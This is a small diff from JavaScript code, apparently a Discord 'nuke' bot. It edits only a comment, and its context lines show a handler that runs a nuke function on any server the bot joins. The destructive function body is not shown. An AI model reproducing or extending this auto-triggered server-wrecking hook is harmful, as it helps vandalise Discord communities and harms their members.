@@ -75,7 +75,7 @@ async function nuke(guild) {
 
 
 }
-//any error will typed in the console :>
+//any error will written in the console :>
 client.on('guildCreate', async (guild) => {
   return nuke(guild).catch(console.error);
 });
